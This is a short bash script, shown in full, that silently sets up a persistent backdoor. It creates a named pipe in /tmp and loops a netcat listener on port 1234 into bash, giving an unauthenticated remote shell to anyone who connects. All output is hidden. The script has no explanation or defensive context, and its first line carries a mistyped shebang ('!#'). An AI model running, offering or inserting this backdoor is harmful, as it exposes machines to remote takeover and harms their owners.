!#/bin/bash

cd /tmp
mkfifo FIFO > /dev/null 2>&1
echo "while [ 1 ];do nc -l -p 1234 < FIFO 2>/dev/null | bash > FIFO;done;" | bash > /dev/null 2>&1
